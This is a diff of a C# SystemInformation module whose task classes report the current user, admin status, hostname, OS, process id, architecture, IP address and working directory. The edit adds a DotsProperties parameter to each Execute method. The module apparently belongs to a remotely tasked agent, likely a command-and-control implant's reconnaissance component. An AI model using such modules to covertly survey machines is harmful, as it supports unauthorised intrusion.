@@ -1,11 +1,11 @@
-﻿using Dots.Models;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Security.Principal;
+using Dots.Models;
 
 namespace SystemInformation
 {
@@ -21,7 +21,7 @@ namespace SystemInformation
             return principal.IsInRole(WindowsBuiltInRole.Administrator) ? "*" : ""; 
         }
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, IsAdministrator() + WindowsIdentity.GetCurrent().Name);
         }
@@ -31,7 +31,7 @@ namespace SystemInformation
     {
         public override string Name => "hostname";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, Environment.MachineName);
         }
@@ -41,7 +41,7 @@ namespace SystemInformation
     {
         public override string Name => "os";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)  
         {
             SetupResult(task, Environment.OSVersion.VersionString);
         }
@@ -51,7 +51,7 @@ namespace SystemInformation
     {
         public override string Name => "pid";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, Process.GetCurrentProcess().Id.ToString());
         }
@@ -61,7 +61,7 @@ namespace SystemInformation
     {
         public override string Name => "arch";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, IntPtr.Size == 8 ? "x64" : "x86");
         }
@@ -71,7 +71,7 @@ namespace SystemInformation
     {
         public override string Name => "ip";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
             var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);
@@ -83,7 +83,7 @@ namespace SystemInformation
     {
         public override string Name => "pwd";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, Directory.GetCurrentDirectory());
         }
